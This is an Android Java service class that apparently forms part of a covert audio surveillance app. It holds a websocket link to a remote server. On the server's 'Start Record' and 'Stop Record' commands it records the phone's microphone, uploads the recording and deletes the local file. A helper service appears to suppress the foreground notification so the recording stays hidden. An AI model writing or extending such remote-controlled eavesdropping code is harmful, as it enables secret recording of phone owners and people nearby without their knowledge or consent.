package play.wait.service;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.v4.app.NotificationCompat;

import org.java_websocket.WebSocket;

import java.io.File;
import java.util.Date;


import play.wait.servicetest.R;
import play.wait.utils.AudioRecorder;
import play.wait.utils.FileUploader;

/**
 * Created by guijj on 9/10/2017.
 */

public class MyService extends Service {
    private WebsocketService wsc;
    private String recordFlag = "";
    private AudioRecorder recorder;
    private File mAudioFile;
    private boolean isConnected = false;

    private Handler messageFromServerHandler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {
            if (msg.what == 1) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        startRecord();
                    }
                }).start();
            }
            if (msg.what == 2) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        stopRecord();
                    }
                }).start();
            }
            return false;
        }
    });


    @Override
    public void onCreate() {
        connectToWebsocketServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
        builder.setAutoCancel(false);
        builder.setOngoing(true);
        builder.setShowWhen(false);
        builder.setSmallIcon(R.mipmap.icon);
        builder.setContentTitle("后台服务正在运行");
        Notification notification = builder.build();
        Intent notificationIntent = new Intent(this, GrayService.class);
        startService(notificationIntent);
        startForeground(8080, notification);
        waitMessageFormServer();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void waitMessageFormServer() {
        new Thread() {
            public void run() {
                while (true) {
                    try {
                        Thread.sleep(2000);
                        System.out.println("=========Not Connect==========" + new Date());
                        if (wsc != null && wsc.getReadState() == WebSocket.READYSTATE.OPEN) {
                            System.out.println("==========Connect=========" + new Date());
                            String messageFromServer = wsc.getMsgFromServer();
                            wsc.send("To Server");
                            if ("Start Record".equals(messageFromServer) && !"Recording".equals(recordFlag)) {
                                recordFlag = "Recording";
                                Message startMess = new Message();
                                startMess.what = 1;
                                messageFromServerHandler.sendMessage(startMess);
                            } else if ("Stop Record".equals(messageFromServer) && "Recording".equals(recordFlag)) {
                                Message stopMess = new Message();
                                stopMess.what = 2;
                                messageFromServerHandler.sendMessage(stopMess);
                                recordFlag = "";
                            } else if (messageFromServer.startsWith("Close Success!")) {
                                System.out.println("Reconect to server 01");
                                isConnected = false;
                                boolean isAvailableNetwork = isAvailableNetwork();
                                if (isAvailableNetwork) {
                                    connectToWebsocketServer();
                                }
                            }
                        } else {
                            if (wsc == null || wsc.getReadState() != WebSocket.READYSTATE.OPEN) {
                                System.out.println("Reconect to server 02");
                                isConnected = false;
                                boolean isAvailableNetwork = isAvailableNetwork();
                                if (isAvailableNetwork) {
                                    connectToWebsocketServer();
                                }
                            }
                        }
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }

    private boolean isAvailableNetwork() {
        int[] networkTypes = {ConnectivityManager.TYPE_MOBILE, ConnectivityManager.TYPE_WIFI};
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            for (int networkType : networkTypes) {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                if (activeNetworkInfo != null &&
                        activeNetworkInfo.getType() == networkType)
                    return true;
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    private void connectToWebsocketServer() {
        while (!isConnected) {
            try {
                Thread.sleep(1000);
                wsc = new WebsocketService();
                if (null != wsc) {
                    wsc.connect();
                    isConnected = true;
                }
            } catch (Exception e) {
                isConnected = false;
            }
        }
    }

    private void startRecord() {
        recorder = AudioRecorder.getInstance();
        mAudioFile = new File(
                Environment.getExternalStorageDirectory().getAbsolutePath() +
                        File.separator + System.nanoTime() + ".m4a");
        recorder.prepareRecord(MediaRecorder.AudioSource.MIC,
                MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC,
                mAudioFile);
        recorder.startRecord(MediaRecorder.AudioSource.MIC, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC,
                AudioRecorder.DEFAULT_SAMPLE_RATE, AudioRecorder.DEFAULT_BIT_RATE, mAudioFile);
    }

    private void stopRecord() {
        try {
            recorder.stopRecord();
            FileUploader.uploadFile(mAudioFile);
            mAudioFile.delete();
        } catch (Exception e) {
            System.out.println(e.getMessage() + "==================");
        }
    }

    private static class GrayService extends Service {

        @Override
        public void onCreate() {

        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(8080, new Notification());
            stopForeground(true);
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }


}
